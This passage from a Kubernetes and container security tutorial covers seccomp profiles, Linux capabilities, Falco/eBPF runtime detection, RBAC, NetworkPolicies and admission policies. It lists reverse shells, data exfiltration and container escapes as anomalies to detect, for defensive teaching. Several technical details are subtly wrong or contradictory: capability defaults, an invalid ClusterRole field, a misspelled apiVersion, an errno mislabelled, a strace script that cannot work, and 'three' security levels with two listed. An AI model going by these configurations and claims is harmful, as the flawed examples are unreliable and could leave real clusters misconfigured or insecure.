  - image: registry.example.com/myapp:1.0  # Could be tampered
    name: app

# ✓ Good: Signature verification via admission controller
# Admission controller policy:
# - Retrieve image digest
# - Verify signature in registry certificate store
# - Check against trusted keys
# - Reject if signature invalid or missing
```

---

## Runtime Container Security

### Textual Deep Dive

#### Internal Working Mechanism

**Seccomp (Secure Computing Mode)**

**Kernel Architecture**:
```
Application (myapp)
    ↓ [syscall: write(fd, buf, count)]
    ↓
Kernel syscall handler
    ↓
[Seccomp filter evaluation]
    ├─ Seccomp policy: write() allowed?
    ├─ YES → execute syscall
    └─ NO → SIGKILL process / log / deny
```

**Seccomp Profiles**:

1. **Permissive Mode**:
```json
{
  "defaultAction": "SCMP_ACT_LOG",
  "defaultErrnoRet": 1,
  "archMap": [{
    "arch": "SCMP_ARCH_X86_64",
    "subArches": ["SCMP_ARCH_X86", "SCMP_ARCH_X32"]
  }],
  "syscalls": []
}
```
**Behavior**: All syscalls logged but allowed. Used for profiling ("what syscalls does application actually use?").

2. **Enforce Mode**:
```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "syscalls": [
    {
      "names": ["read", "write", "open", "close", "brk"],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": ["ptrace", "process_vm_readv", "prctl"],
      "action": "SCMP_ACT_ERRNO"
    }
  ]
}
```
**Behavior**: Only whitelisted syscalls allowed; others return EACCES. Application receives permission denied rather than fatal signal.

**Production Implications**:
- Profiling: Run permissive, extract log syscalls, create baseline
- Enforcement: Deploy enforce mode baseline, any non-whitelisted syscalls blocked
- Auditing: Monitor seccomp violations for anomaly detection

**Linux Capabilities**

**Traditional Unix Model**:
- uid=0 (root): All privileges
- uid>0 (non-root): Highly restricted

**Capability Model** (Linux 2.2+):
Divides root privileges into granular capabilities:

| Capability | Purpose | Danger |
|------------|---------|--------|
| `CAP_NET_RAW` | Create raw sockets | Can craft custom IP packets, potential spoofing |
| `CAP_SYS_ADMIN` | System administration | Broad privilege, enable module loading, namespace operations |
| `CAP_SYS_PTRACE` | Debug processes | Can inspect/modify other process memory |
| `CAP_DAC_OVERRIDE` | Bypass file permissions | Read any file regardless of ownership |
| `CAP_NET_BIND_SERVICE` | Bind to ports < 1024 | Allows service binding on privileged ports |
| `CAP_SYS_TIME` | Set system time | Modify system clock |
| `CAP_SYS_MODULE` | Load kernel modules | Load unsigned kernel code |

**Container Default Capabilities** (Linux Kernel defaults dropped):
```c
// Modern container runtimes drop by default:
_NOT_ CAP_SYS_ADMIN
_NOT_ CAP_SYS_PTRACE
_NOT_ CAP_SYS_MODULE
_NOT_ CAP_CHOWN
_NOT_ CAP_DAC_OVERRIDE

// Allowed by default:
CAP_SETUID, CAP_SETGID
CAP_NET_BIND_SERVICE
CAP_CHOWN, CAP_DAC_OVERRIDE (usually dropped too)
```

**Capability Dropping Strategy**:
```dockerfile
# Stage 1: Drop all, add only required
FROM ubuntu:22.04
USER appuser
# Application requests: CAP_NET_BIND_SERVICE (for port 8080)
#                      CAP_SETUID (for user context switching)
# Kubernetes Pod:
securityContext:
  capabilities:
    drop:
    - ALL
    add:
    - CAP_NET_BIND_SERVICE
    - CAP_SETUID
```

**Privilege Escalation via Capabilities**:
```bash
# Vulnerable: CAP_SYS_ADMIN granted
# Attacker can:
- Load kernel modules (bypass security checks)
- Create nested namespaces (escape orchestration)
- Perform privileged operations (mount filesystems)
- Potential container escape root cause

# Mitigated: CAP_SYS_ADMIN dropped
# Attacker cannot perform above, requires kernel exploit outside docker model
```

**Runtime Monitoring & Threat Detection**

**Behavioral Baselining**:
```
Collect runtime events:
- Syscall patterns (strace output)
- Network connections (netstat, tcpdump)
- File access (audit framework)
- Process spawning (auditd, perf)

Establish baseline:
- Normal application behavior: read config, connect database, serve HTTP
- Anomalies: unseen syscalls, unexpected network connections, process spawning

Detection:**
Deploy runtime agent (Falco, Sysdig, Tetragon):
- Collect kernel events via eBPF/syscall tracing
- Compare against baseline/rules
- Alert on anomalies
```

**Example Detectable Anomalies**:
1. **Container escape attempt**: `execve("/host/bin/bash")` from container process
2. **Reverse shell**: Outbound connection from application to attacker IP + shell spawning
3. **Cryptominer**: Unexpected CPU consumption + network connection to mining pool
4. **Data exfiltration**: Large data transfer to unexpected external IP
5. **Privilege escalation**: `setuid` system call from non-root process

**eBPF-Based Monitoring**:
```c
// Simplified eBPF program for syscall tracing
#include <uapi/linux/ptrace.h>
#include <net/sock.h>

BPF_HASH(syscall_counts, u32);

TRACEPOINT_PROBE(raw_syscalls, sys_enter) {
    u32 syscall = args->id;
    u64 *count = syscall_counts.lookup_or_init(&syscall, &zero);
    (*count)++;
    
    // Alert if suspicious syscall detected
    if (syscall == SYS_ptrace || syscall == SYS_sysctl) {
        bpf_trace_printk("Suspicious syscall: %d\\n", syscall);
    }
    return 0;
}

// Output: Real-time syscall telemetry without containers stopping for data collection
```

#### Architecture Role

Runtime container security operates at **execution time**, detecting and preventing exploits that bypassed build-time and admission controls:

```
Build Time: Image scanning, vulnerability detection
    → Misses: Zero-days, logic bugs, supply chain malware
    ↓
Admission Time: Image validation, pod security policies
    → Misses: Post-deployment exploit attempts
    ↓
Runtime Time: Behavioral monitoring, seccomp enforcement
    → Catches: Active exploitation, anomalous behavior
    ↓
If runtime detection fails → Forensics, incident response
```

**Responsibility Mapping**:

| Role | Responsibility |
|------|-----------------|
| **Cluster Operator** | Deploy runtime security agents, tune baselining, respond to alerts |
| **Security Engineer** | Define behavioral baselines, create detection rules, investigate incidents |
| **DevOps Engineer** | Integrate seccomp profiles into CI/CD, document capability requirements |
| **Application Team** | Profile application behavior, provide baseline for detection tuning |

#### Production Usage Patterns

**Pattern 1: Permissive Profiling → Enforce Deployment**

```
Week 1-2: Deploy permissive seccomp, collect syscall logs
    ↓
Analyze logs: Extract actual syscall set
    ↓
Create enforce profile with baseline syscalls + 10% safety margin
    ↓
Deploy enforce profile with alert (don't block initially)
    ↓
Monitor violations for 1-2 weeks
    ↓
If no violations → Enable enforcement (block violations)
    ↓
If violations occur → Adjust profile, document exceptions
```

**Benefit**: Avoids breaking applications with overly-strict profiles while ensuring tight security.

**Pattern 2: Graduated Capability Dropping**

```
Phase 1 (Week 1): Drop obviously dangerous capitals
- Drop: CAP_SYS_MODULE, CAP_SYS_ADMIN, CAP_SYS_PTRACE

Phase 2 (Week 2): Drop file permission bypass
- Drop: CAP_DAC_OVERRIDE, CAP_CHOWN

Phase 3 (Week 3): Drop network primitives
- Drop: CAP_NET_RAW (allow only CAP_NET_BIND_SERVICE)

Phase 4 (Month 2): Drop process control
- Drop: CAP_SETUID, CAP_SETGID (if no privilege context-switch required)
```

**Benefit**: Allows time for application teams to find legitimate capability requirements before full enforcement.

**Pattern 3: Runtime Threat Detection Pipeline**

```
Falco eBPF probes (kernel events)
    ↓ [detection rules: suspicious syscalls, network anomalies]
    ↓
Alert: Potential reverse shell (unexpected outbound + /bin/bash fork)
    ↓
Webhook → Slack notification (incident channel)
    ↓
Automated response options:
- Drain node, pause workload (preserve forensics)
- Kill container, rotate credentials
- Increase monitoring verbosity
- Generate forensic snapshot
```

#### DevOps Best Practices

**1. Seccomp Profile Baseline Strategy**

```bash
#!/bin/bash
# Generate seccomp baseline from application logs

APP_PID=$(pgrep -f "myapp")
STRACE_OUTPUT="/tmp/strace.txt"

# Trace syscalls during normal operation (5 minutes)
strace -p ${APP_PID} -o ${STRACE_OUTPUT} -e trace=file,network

# Extract syscall list
SYSCALLS=$(grep -oE 'syscall_[0-9]+' ${STRACE_OUTPUT} | sort -u)

# Generate seccomp profile JSON
cat > seccomp.json <<EOF
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "syscalls": [
    {
      "names": [$(echo $SYSCALLS | sed 's/ /", "/g')],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
EOF
```

**2. Capability Requirement Documentation**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: myapp
  annotations:
    secops.company.com/capabilities-required: |
      CAP_NET_BIND_SERVICE:
        reason: "Application serves HTTP on port 8080"
        justification: "Standard web application requirement"
        expiry: "2025-12-31"
      CAP_SETUID:
        reason: "Application drops privileges after startup"
        justification: "Legitimate privilege separation pattern"
        expiry: "2025-12-31"
spec:
  containers:
  - name: app
    image: myapp:1.0
    securityContext:
      capabilities:
        drop:
        - ALL
        add:
        - CAP_NET_BIND_SERVICE
        - CAP_SETUID
      readOnlyRootFilesystem: true
      allowPrivilegeEscalation: false
```

**3. Runtime Agent Integration**

```yaml
# Falco DaemonSet for Kubernetes cluster monitoring
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: falco
  namespace: falco
spec:
  selector:
    matchLabels:
      app: falco
  template:
    metadata:
      labels:
        app: falco
    spec:
      serviceAccountName: falco
      containers:
      - name: falco
        image: falcosecurity/falco:latest
        securityContext:
          privileged: true  # Required for eBPF probe loading
        volumeMounts:
        - name: docker
          mountPath: /var/run/docker.sock
        - name: containerd
          mountPath: /run/containerd
        env:
        - name: FALCO_K8S_AUDIT_ENDPOINT
          value: "http://localhost:5037"
      volumes:
      - name: docker
        hostPath:
          path: /var/run/docker.sock
      - name: containerd
        hostPath:
          path: /run/containerd
```

#### Common Pitfalls

**Pitfall 1: Overly Permissive Seccomp**

```yaml
# ❌ Bad: No seccomp enforcement
metadata:
  annotations:
    security.alpha.kubernetes.io/seccomp: "unconfined"
# Application can use ANY syscall; no runtime protection

# ✓ Good: Explicit enforcement
securityContext:
  seccompProfile:
    type: RuntimeDefault  # Use container runtime default
    OR
    type: Localhost
    localhostProfile: my-profile.json  # Use custom profile
```

**Pitfall 2: Granting All Capabilities**

```yaml
# ❌ Bad: SYS_ADMIN grants almost root-equivalent privileges
securityContext:
  capabilities:
    add:
    - CAP_SYS_ADMIN
# Container can load modules, potentially escape

# ✓ Good: Drop all, add only necessary
securityContext:
  capabilities:
    drop:
    - ALL
    add:
    - CAP_NET_BIND_SERVICE
```

**Pitfall 3: Privileged Mode Escape Hatch**

```yaml
# ❌ Bad: Development convenience becomes production reality
securityContext:
  privileged: true
# Grants all capabilities + disables selinux/apparmor
# Container essentially runs as root kernel-wide

# Reality: privileged: true ≈ CAP_SYS_ADMIN ≈ container escape vector
```

**Fix**: Use pod security policies to prevent privileged mode in production.

**Pitfall 4: No Monitoring Baseline**

```bash
# ❌ Bad: Deploy to production with default seccomp, no baseline
docker run --name myapp myapp:1.0
# If exploit happens, unclear what "normal" syscalls are

# ✓ Good: Establish baseline
strace -o baseline.txt docker run myapp:1.0
# After 1-2 weeks production operation:
strace -o prod.txt docker run myapp:1.0
# Compare, document exceptions, enforce
```

**Pitfall 5: Insufficient eBPF Knowledge**

Many operators deploy runtime agents (Falco) but:
- Don't tune baselines (high false positives)
- Don't integrate alerts into incident response (alerts ignored)
- Don't forensically collect data (only real-time monitoring)
- Don't update detection rules (miss new attack patterns)

**Fix**: Establish security operations team to manage runtime detection lifecycle.

---

## Kubernetes Security Fundamentals

### Textual Deep Dive

#### Internal Working Mechanism

**RBAC (Role-Based Access Control)**

**API Server Request Flow**:
```
kubectl command (e.g., kubectl get pods)
    ↓
API Server authentication (verify identity: user, service account)
    ↓
API Server authorization (verify permission):
    1. Extract subject: (user: alice@example.com, groups: [developers])
    2. Extract action: (verb: get, resource: pods, namespace: default)
    3. Evaluate RBAC rules:
       - Check all ClusterRoles + Roles for matching subjects
       - Check if rule matches action
    4. If matching rule found → Allow
    5. If no matching rule → Deny
    ↓
API Server admission control (validate/mutate request)
    ↓
request processed or rejected
```

**RBAC Components**:

1. **Role** (namespace-scoped):
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: payments
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list", "watch"]
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get"]  # Only GET secrets, not LIST
```

2. **RoleBinding** (attach Role to subjects):
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods
  namespace: payments
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: pod-reader
subjects:
- kind: ServiceAccount
  name: app-sa
  namespace: payments
- kind: User
  name: alice@example.com
```

3. **ClusterRole** (cluster-scoped permissions):
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pod-reader-all-namespaces
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
  namespaces: ["*"]  # Can read pods in any namespace
```

4. **ClusterRoleBinding** (attach ClusterRole globally):
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: read-pods-global
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: pod-reader-all-namespaces
subjects:
- kind: Group
  name: developers
```

**Matching Logic** (why requests succeed or fail):
```
Request: user alice@example.com, action: get pods in namespace payments
    ↓
Search all Roles in namespace "payments"
    └─ Role "pod-reader": verbs=[get,list,watch], resources=[pods]
       ✓ Matches request
    ↓
Search all RoleBindings in namespace "payments"
    └─ RoleBinding "read-pods": 
       Subjects: [app-sa (namespace payments), alice@example.com]
       ✓ alice@example.com is subject, role "pod-reader" matches
    ↓
Result: Allow
```

**Pod Security Context**

**Components**:
```yaml
securityContext:
  runAsUser: 1000                    # UID application runs as
  runAsNonRoot: true                 # Enforces uid > 0
  readOnlyRootFilesystem: true       # Root FS mounted read-only
  allowPrivilegeEscalation: false    # Cannot elevate uid
  runAsGroup: 3000                   # GID application runs as
  fsGroup: 2000                      # GID for volume mounts
  seccompProfile:
    type: RuntimeDefault             # Use pod runtime default seccomp
  capabilities:
    drop:
    - ALL                            # Drop all Linux capabilities
    add:
    - NET_BIND_SERVICE               # Add only required capability
```

**Pod-level vs. Container-level**:
```yaml
spec:
  securityContext:                   # Pod-level (affects all containers)
    runAsUser: 1000
  containers:
  - name: app
    securityContext:                 # Container-level (overrides pod)
      runAsUser: 2000                # This container runs as uid 2000
```

**Network Policies**

**NetworkPolicy Architecture**:
```
Pod A (label: tier=web)
    ↓ [outbound request to Pod B]
    ↓
CNI Network Plugin evaluates NetworkPolicy rules:
    1. Extract pod labels, namespace
    2. Check ingress/egress rules
    3. If rule matches:
       - direction: ingress, from: {podSelector: tier=web}, ports: 5432
       - Pod B allows traffic from tier=web on port 5432
    4. Allow packet flow
    5. If no matching rule → Deny (default-deny model)
```

**NetworkPolicy Resource**:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: database-access-control
  namespace: payments
spec:
  podSelector:                       # Pods this policy targets
    matchLabels:
      tier: database
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:             # Allow traffic from prod namespace
        matchLabels:
          name: prod
    - podSelector:                   # Allow traffic from web tier pods
        matchLabels:
          tier: web
    ports:
    - protocol: TCP
      port: 5432
```

**Default-Deny Pattern**:
```yaml
# 1. Explicit deny-all (implicit default-deny if no rules match)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
spec:
  podSelector: {}                    # Affects all pods in namespace
  policyTypes:
  - Ingress
  - Egress
  # Empty rules = deny all

# 2. Allow specific traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-to-api
spec:
  podSelector:
    matchLabels:
      app: api
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: web
    ports:
    - protocol: TCP
      port: 8080
```

**Limitation**: Network policies don't protect control plane (API server, etcd, kubelet) or cluster-external traffic.

#### Architecture Role

Kubernetes security fundamentals form the **cluster-level authorization and isolation layer**:

```
User/Service Account
    ↓ [RBAC determines access]
    ↓ [Pod Security Standards determine execution constraints]
    ↓ [Network Policies determine traffic flow]
    ↓
Kubernetes API / Resource access / Network connectivity
```

**Responsibility Mapping**:

| Role | Responsibility |
|------|-----------------|
| **Cluster Admin** | Design RBAC hierarchy, Pod Security Standard profiles, network policy architecture |
| **Namespace Admin** | Grant team members roles within namespace, enforce pod security standards |
| **DevOps Engineer** | Implement RBAC for service accounts, define network policies for applications |
| **Security Team** | Audit RBAC assignments, verify network policy effectiveness, detect misconfiguration |

#### Production Usage Patterns

**Pattern 1: Namespace-per-Team RBAC**

```yaml
# Namespace: team-payments
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: developer
  namespace: team-payments
rules:
- apiGroups: ["apps"]
  resources: ["deployments", "statefulsets"]
  verbs: ["get", "list", "watch", "create", "update", "patch"]
- apiGroups: ["v1"]
  resources: ["pods", "pods/logs"]
  verbs: ["get", "list", "watch"]
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: developers
  namespace: team-payments
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: developer
subjects:
- kind: Group
  name: "payments-team@example.com"
```

**Benefit**: Each team operates within namespace boundaries; cross-namespace access prevented.

**Pattern 2: Service Account per Application**

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: payment-processor
  namespace: payments
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: payment-processor-role
  namespace: payments
rules:
- apiGroups: [""]
  resources: ["secrets"]
  resourceNames: ["db-credentials"]  # Only specific secret
  verbs: ["get"]
- apiGroups: [""]
  resources: ["configmaps"]
  resourceNames: ["app-config"]      # Only specific config
  verbs: ["get"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: payment-processor-bind
  namespace: payments
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: payment-processor-role
subjects:
- kind: ServiceAccount
  name: payment-processor
  namespace: payments
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-processor
  namespace: payments
spec:
  template:
    spec:
      serviceAccountName: payment-processor  # Use dedicated SA
      containers:
      - name: app
        image: myapp:1.0
```

**Benefit**: Application limited to required resources; compromise doesn't grant cluster-wide access.

**Pattern 3: Network Policy per Application Tier**

```yaml
# Tier 1: Web tier (ingress from load balancer, egress to API)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: web-tier-network-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: web
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: ingress-controller
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector:
        matchLabels:
          tier: api
    ports:
    - protocol: TCP
      port: 8080
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 53  # DNS
---
# Tier 2: API tier (ingress from web, egress to database)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: api-tier-network-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: api
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          tier: web
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector:
        matchLabels:
          tier: database
    ports:
    - protocol: TCP
      port: 5432
---
# Tier 3: Database tier (ingress only from API, no egress)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: database-tier-network-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: database
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          tier: api
    ports:
    - protocol: TCP
      port: 5432
  egress: []  # No outbound traffic
```

#### DevOps Best Practices

**1. RBAC Namespace Strategy**

```bash
#!/bin/bash
# Script: Enforce namespace-level RBAC isolation

NAMESPACES=("dev" "staging" "prod")

for NS in "${NAMESPACES[@]}"; do
  # 1. Create namespace
  kubectl create namespace $NS
  
  # 2. Create team-specific role
  kubectl apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: developer
  namespace: $NS
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "watch"]
EOF

  # 3. Bind to team group
  kubectl apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: team-developers
  namespace: $NS
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: developer
subjects:
- kind: Group
  name: developers@example.com
EOF
done
```

**2. Pod Security Standards Enforcement**

```yaml
oadVersion: policy.kubernetes.io/v1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
  - ALL
  volumes:
  - 'configMap'
  - 'emptyDir'
  - 'projected'
  - 'secret'
  - 'downwardAPI'
  - 'persistentVolumeClaim'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'MustRunAs'
    seLinuxOptions:
      type: "restricted"
  fsGroup:
    rule: 'MustRunAs'
  readOnlyRootFilesystem: true
```

**3. Network Policy Audit**

```bash
#!/bin/bash
# Audit Network Policies: Verify coverage, detect gaps

# List all NetworkPolicies
NS=${1:-default}
echo "=== Network Policies in $NS ==="
kubectl get networkpolicies -n $NS

# For each policy, show affected pods
for POLICY in $(kubectl get networkpolicies -n $NS -o name); do
  echo ""
  echo "Policy: $POLICY"
  SELECTOR=$(kubectl get $POLICY -n $NS -o jsonpath='{.spec.podSelector}')
  echo "Affects pods: $SELECTOR"
  
  # Show rules
  kubectl get $POLICY -n $NS -o yaml | grep -A 20 "spec:"
done

# Check: Are there pods NOT covered by any NetworkPolicy?
echo ""
echo "=== Pods WITHOUT NetworkPolicy coverage ==="
for POD in $(kubectl get pods -n $NS -o name | cut -d/ -f2); do
  POD_SELECTOR=$(kubectl get pod $POD -n $NS -o jsonpath='{.metadata.labels}')
  COVERED=$(kubectl get networkpolicies -n $NS --field-selector matchExpressions=$POD_SELECTOR 2>/dev/null | wc -l)
  if [ $COVERED -eq 0 ]; then
    echo "Uncovered pod: $POD"
  fi
done
```

#### Common Pitfalls

**Pitfall 1: Overly Permissive ClusterRole**

```yaml
# ❌ Bad: Wildcard permissions (too broad)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: admin-equivalent
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
# User has root-equivalent access to cluster

# ✓ Good: Specific permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list", "watch"]
```

**Pitfall 2: Shared Service Accounts**

```yaml
# ❌ Bad: Multiple applications use default service account
spec:
  serviceAccountName: default  # If compromised, attacker has default SA access

# ✓ Good: Dedicated service accounts
spec:
  serviceAccountName: payment-processor  # Per-application SA
```

**Pitfall 3: No NetworkPolicy Enforcement**

```yaml
# ❌ Bad: No network policies defined
# Any pod can communicate with any other pod (flat network)

# ✓ Good: Default-deny + explicit allow
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  # Empty rules = deny all
```

**Pitfall 4: Pod Security Standards Ignored**

```yaml
# ❌ Bad: Pods violate security standards but no enforcement
spec:
  securityContext:
    runAsUser: 0  # Running as root despite policy
    privileged: true

# ✓ Good: Admission controller enforces
# Pod Security Standards admission controller rejects non-compliant pods
```

---

## Advanced Kubernetes Security

### Textual Deep Dive

#### Internal Working Mechanism

**Admission Controllers**

**Request Flow with Admission Control**:
```
API Request (kubectl apply deployment.yaml)
    ↓
API Server authentication & RBAC authorization
    ↓
Admission Controllers (sequential evaluation):
    │
    ├─ Validating Controllers (accept/reject):
    │  ├─ PodSecurityPolicy (deprecated, use Pod Security Standards)
    │  ├─ ResourceQuota validator
    │  ├─ Custom webhook validators
    │  └─ If ANY validator rejects → Request denied
    │
    ├─ Mutating Controllers (modify request):
    │  ├─ ServiceAccount injector
    │  ├─ Image pull secret injector
    │  ├─ Custom webhook mutators
    │  └─ Request modified before persistence
    │
    └─ Return to validating after mutations (re-validate)
    ↓
Persist to etcd (or reject if re-validation fails)
    ↓
Response to client
```

**Types of Admission Controllers**:

1. **Built-in Validating** (enabled by default):
   - `LimitRanger`: Enforces resource limits
   - `ResourceQuota`: Enforces namespace resource quotas
   - `ServiceAccount`: Validates service account existence
   - `PodSecurityPolicy` (deprecated): Pod security constraints

2. **Built-in Mutating** (enabled by default):
   - `ServiceAccount`: Injects default service account if not specified
   - `DefaultStorageClass`: Assigns default storage class to PVCs
   - `NamespaceAutoProvisioning`: Auto-creates namespaces (rarely enabled)

3. **Webhook-Based** (custom):
   - `ValidatingWebhookConfiguration`: External validation service
   - `MutatingWebhookConfiguration`: External mutation service

**Webhook Implementation**:
```yaml
# ConfigMapWebhook: Validates ConfigMap creation
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: configmap-validator
webhooks:
- name: validate-configmaps.example.com
  clientConfig:
    service:
      name: admission-webhook
      namespace: default
      path: "/validate"
    caBundle: <base64-encoded-ca-cert>
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["configmaps"]
    scope: "Namespaced"
  admissionReviewVersions: ["v1"]
  sideEffects: NoneOnDryRun
  failurePolicy: Fail  # If webhook fails, request is denied
```

**Webhook Server Logic**:
```go
// Simplified webhook handler
func validateConfigMap(w http.ResponseWriter, r *http.Request) {
    // Parse admission review
    var admissionReview v1.AdmissionReview
    json.NewDecoder(r.Body).Decode(&admissionReview)
    
    configMap := corev1.ConfigMap{}
    json.Unmarshal(admissionReview.Request.Object.Raw, &configMap)
    
    // Validation logic
    allowed := true
    message := ""
    
    // Check: ConfigMap doesn't contain secrets in plain text
    for key, value := range configMap.Data {
        if strings.Contains(strings.ToLower(value), "password=") ||
           strings.Contains(strings.ToLower(value), "secret=") {
            allowed = false
            message = fmt.Sprintf("ConfigMap contains plain-text secrets in key %s", key)
            break
        }
    }
    
    // Return admission response
    response := &v1.AdmissionResponse{
        UID:     admissionReview.Request.UID,
        Allowed: allowed,
        Result: &metav1.Status{
            Message: message,
        },
    }
    
    responseReview := v1.AdmissionReview{
        Kind: "AdmissionReview",
        APIVersion: "admission.k8s.io/v1",
        Response: response,
    }
    
    json.NewEncoder(w).Encode(responseReview)
}
```

**OPA/Kyverno** (Policy Engines)

**OPA (Open Policy Agent)**:
- General-purpose policy engine (not Kubernetes-specific)
- Policies written in Rego language
- Webhook-based admission control integration
- Supports complex policy logic (multi-rule, conditional, lookup)

**OPA Policy Example** (Rego):
```rego
# Policy: Deny containers running as root

package kubernetes.admission

# Deny if pod runs as root
deny[msg] {
    input.request.kind.kind == "Pod"
    container := input.request.object.spec.containers[_]
    not container.securityContext.runAsUser  # No runAsUser specified
    msg := sprintf("Container %v must specify runAsUser > 0", [container.name])
}

deny[msg] {
    input.request.kind.kind == "Pod"
    container := input.request.object.spec.containers[_]
    container.securityContext.runAsUser == 0  # Explicitly uid 0
    msg := sprintf("Container %v cannot run as uid 0", [container.name])
}

# Require resource limits
deny[msg] {
    input.request.kind.kind == "Pod"
    container := input.request.object.spec.containers[_]
    not container.resources.limits.cpu
    msg := sprintf("Container %v must set CPU limit", [container.name])
}
```

**Kyverno** (Kubernetes-specific):
- Policy engine designed for Kubernetes
- Policies written in YAML (easier for Kubernetes ops than Rego)
- Webhook-based admission control
- Simpler policy logic but sufficient for most Kubernetes use cases

**Kyverno Policy Example**:
```yaml
# Policy: Require non-root user and resource limits
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-non-root-and-limits
spec:
  validationFailureAction: audit  # Audit or enforce
  rules:
  - name: check-runAsUser
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Pod must specify runAsUser > 0"
      pattern:
        spec:
          securityContext:
            runAsUser: ">0"
  - name: check-resource-limits
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "CPU and memory limits required"
      pattern:
        spec:
          containers:
          - resources:
              limits:
                cpu: "?*"
                memory: "?*"
  - name: block-privileged
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Privileged pods not allowed"
      pattern:
        spec:
          containers:
          - securityContext:
              privileged: false
```

**Service Mesh Security**

**Service Mesh Architecture**:
```
Pod A                              Pod B
  │                                  │
  ├─ Sidecar Proxy (Envoy)         ├─ Sidecar Proxy (Envoy)
  │  Control Plane (Istio)         │  Control Plane (Istio)
  └─────────────────────────────────┘
       mTLS tunnel (encrypted + authenticated)
       
Control Plane configured:
- mTLS certificates
- Traffic policies
- Authorization policies
```

**Service Mesh Security Benefits**:

1. **Automatic mTLS** (mutual TLS):
   - Every pod-to-pod connection encrypted
   - No application code changes required
   - Certificates automatically rotated
   - Unlike NetworkPolicy (L3/L4), Service Mesh provides L7 encryption

2. **Authorization Policies** (beyond RBAC):
   ```yaml
   apiVersion: security.istio.io/v1beta1
   kind: AuthorizationPolicy
   metadata:
     name: api-policy
     namespace: production
   spec:
     selector:
       matchLabels:
         app: api
     rules:
     - from:
       - source:
           principals: ["cluster.local/ns/production/sa/web"]  # Only web SA
       to:
       - operation:
           methods: ["GET", "POST"]
           paths: ["/api/v1/*"]
   ```

3. **Encrypted Service-to-Service**:
   - East-west traffic encryption (internal, not external)
   - Prevents eavesdropping on cluster traffic
   - Detects man-in-the-middle attacks (certificate validation)

**Pod Security Policies (Deprecated, use Pod Security Standards)**

Modern Kubernetes uses Pod Security Standards (built-in admission controller), not Pod Security Policies (deprecated webhook).

**Pod Security Standards** define three security levels:

- **Restricted**: Highly constrained, suitable for production workloads
- **Baseline**: Minimal constraints, covers common deployment patterns
